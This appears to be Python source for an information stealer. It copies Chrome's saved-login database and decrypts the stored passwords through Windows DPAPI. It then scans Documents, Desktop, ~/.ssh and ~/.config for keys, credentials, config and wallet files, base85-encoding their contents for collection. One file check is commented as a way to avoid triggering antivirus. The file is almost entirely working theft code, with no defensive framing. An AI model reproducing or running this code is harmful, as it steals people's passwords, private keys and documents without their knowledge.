import os
import sys
import json
import base64
import sqlite3
import platform
import threading
import ctypes
from typing import Dict, List, Optional
from datetime import datetime
from pathlib import Path
import logging
import win32crypt
import win32api
import win32con
import win32process
import win32security
import win32file

class CredentialManager:
    def __init__(self):
        self.platform = platform.system().lower()
        
    def _get_chrome_path(self) -> str:
        """Get Chrome data path based on OS"""
        if self.platform == 'windows':
            return os.path.join(os.getenv('LOCALAPPDATA'),
                'Google\\Chrome\\User Data\\Default')
        elif self.platform == 'linux':
            return os.path.expanduser('~/.config/google-chrome/Default')
        return ''
        
    def _decrypt_windows(self, encrypted: bytes) -> str:
        """Decrypt using Windows DPAPI"""
        try:
            return win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1]
        except:
            return None
            
    def _get_chrome_passwords(self) -> List[Dict]:
        """Get Chrome passwords using native methods"""
        try:
            path = os.path.join(self._get_chrome_path(), 'Login Data')
            if not os.path.exists(path):
                return []
                
            # Copy DB to temp file to avoid lock
            temp_path = os.path.join(os.getenv('TEMP'), 'chrome_pwd.db')
            with open(path, 'rb') as f:
                content = f.read()
            with open(temp_path, 'wb') as f:
                f.write(content)
                
            passwords = []
            try:
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                cursor.execute('''
                    SELECT origin_url, username_value, password_value 
                    FROM logins
                ''')
                
                for url, username, encrypted_pwd in cursor.fetchall():
                    if self.platform == 'windows':
                        pwd = self._decrypt_windows(encrypted_pwd)
                    else:
                        pwd = self._decrypt_linux(encrypted_pwd)
                        
                    if pwd:
                        passwords.append({
                            'url': url,
                            'username': username,
                            'password': pwd
                        })
                        
                conn.close()
            finally:
                try:
                    os.remove(temp_path)
                except:
                    pass
                    
            return passwords
        except:
            return []
            
    def _decrypt_linux(self, encrypted: bytes) -> str:
        """Decrypt using Linux methods"""
        # TO DO: implement Linux decryption
        return None
        
class DocumentScanner:
    def __init__(self):
        self.interesting_extensions = {
            'document': ['.doc', '.docx', '.pdf', '.txt', '.rtf'],
            'spreadsheet': ['.xls', '.xlsx', '.csv'],
            'source': ['.py', '.js', '.java', '.cpp', '.cs'],
            'config': ['.conf', '.ini', '.env', '.cfg'],
            'key': ['.pem', '.key', '.pfx', '.p12']
        }
        self.interesting_names = [
            'password', 'secret', 'credential', 'key', 'token',
            'config', 'private', 'backup', 'database', 'wallet'
        ]
        
    def _is_interesting_file(self, path: str) -> bool:
        """Check if file is interesting"""
        try:
            # Check extension
            ext = os.path.splitext(path)[1].lower()
            if any(ext in exts for exts in self.interesting_extensions.values()):
                return True
                
            # Check name
            name = os.path.basename(path).lower()
            if any(keyword in name for keyword in self.interesting_names):
                return True
                
            return False
        except:
            return False
            
    def _can_read_file(self, path: str) -> bool:
        """Check if we can read file without triggering AV"""
        try:
            # Check file size
            if os.path.getsize(path) > 10 * 1024 * 1024:  # 10MB
                return False
                
            # Check if process has access
            if platform.system().lower() == 'windows':
                try:
                    handle = win32file.CreateFile(
                        path,
                        win32con.GENERIC_READ,
                        win32con.FILE_SHARE_READ,
                        None,
                        win32con.OPEN_EXISTING,
                        0,
                        None
                    )
                    win32file.CloseHandle(handle)
                    return True
                except:
                    return False
            else:
                return os.access(path, os.R_OK)
        except:
            return False
            
    def scan_directory(self, path: str) -> List[Dict]:
        """Scan directory for interesting files"""
        results = []
        try:
            for root, dirs, files in os.walk(path):
                for file in files:
                    try:
                        full_path = os.path.join(root, file)
                        if self._is_interesting_file(full_path) and self._can_read_file(full_path):
                            with open(full_path, 'rb') as f:
                                content = f.read()
                                
                            results.append({
                                'path': full_path,
                                'size': len(content),
                                'content': base64.b85encode(content).decode()
                            })
                    except:
                        continue
        except:
            pass
            
        return results
        
class SystemCollector:
    def __init__(self):
        self.platform = platform.system().lower()
        self.credentials = CredentialManager()
        self.documents = DocumentScanner()
        
    def collect_all(self) -> Dict:
        """Collect all critical data"""
        data = {
            'timestamp': datetime.now().isoformat(),
            'platform': self.platform,
            'chrome_passwords': self.credentials._get_chrome_passwords()
        }
        
        # Scan important directories
        if self.platform == 'windows':
            paths = [
                os.path.expanduser('~/Documents'),
                os.path.expanduser('~/Desktop'),
                os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft'),
                os.path.join(os.getenv('APPDATA'), 'Microsoft')
            ]
        else:
            paths = [
                os.path.expanduser('~/Documents'),
                os.path.expanduser('~/Desktop'),
                os.path.expanduser('~/.ssh'),
                os.path.expanduser('~/.config')
            ]
            
        for path in paths:
            try:
                results = self.documents.scan_directory(path)
                if results:
                    data[f'files_{path.replace("/", "_")}'] = results
            except:
                continue
                
        return data
